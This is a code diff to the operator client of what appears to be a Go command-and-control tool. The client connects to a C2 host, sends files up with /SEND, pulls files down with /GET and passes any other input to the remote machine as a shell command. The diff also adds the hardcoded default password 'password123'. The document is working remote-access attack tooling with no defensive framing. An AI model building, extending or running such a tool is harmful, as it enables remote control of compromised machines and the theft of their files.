@@ -22,11 +22,11 @@ var (
 func main() {
 	flag.StringVar(&C2Host, "h", "localhost", "Specify the host's address.")
 	flag.StringVar(&C2Port, "p", "9999", "Specify the host's port.")
-	flag.StringVar(&C2Password, "k", "", "Specify the authentication password.")
+	flag.StringVar(&C2Password, "k", "password123", "Specify the authentication password.")
 	
 	flag.Parse()
 
-	stream, err := net.Dial("tcp", fmt.Sprintf("%s:%s", C2Host, C2Port))
+	stream, err := net.Dial("tcp", net.JoinHostPort(C2Host, C2Port))
 
 	if err != nil {
 		slog.Error("An error occured while establishing the server.", slog.Any("ERROR", err))
@@ -36,7 +36,7 @@ func main() {
 	defer stream.Close()
 
 	slog.Info(fmt.Sprintf("Connecting to %s.", stream.RemoteAddr()))
-	key, err := grevcore.DeriveKey(stream, C2Password)
+	key, err := grevcore.ExchangeKey(stream, C2Password)
 
 	if err != nil {
 		slog.Error("An error occured while deriving the key.", slog.Any("ERROR", err))
@@ -63,12 +63,18 @@ func ProcessLoop(c net.Conn, key []byte) {
 
 		fields := strings.Fields(line)
 
-		if len(fields) == 0 {
+
+		if len(fields) < 1 {
 			continue
 		}
 
 		switch fields[0] {
 		case "/SEND":
+			if len(fields) < 2 {
+				fmt.Printf("Missing argument.\n")
+				continue
+			}
+
 			packet.Header = grevcore.FileReceiveHeader
 
 			filename := fields[1]
@@ -76,13 +82,17 @@ func ProcessLoop(c net.Conn, key []byte) {
 
 			if err != nil {
 				slog.Error("An error occured while reading file.", slog.Any("ERROR", err), slog.Any("FILE", filename))
-				break;
+				continue
 			}
 
 			packet.FileName = filename
 			packet.Data = data 
 
 		case "/GET":
+			if len(fields) < 2 {
+				fmt.Printf("Missing argument.\n")
+				continue
+			}
 			packet.Header = grevcore.FileSendHeader
 			filename := fields[1]
 
@@ -90,9 +100,6 @@ func ProcessLoop(c net.Conn, key []byte) {
 
 		case "/EXIT":
 			return
-
-		case "/CANCEL":
-			packet.Data = []byte("\x03")
 
 		default:
 			packet.Header = grevcore.ShellExecHeader
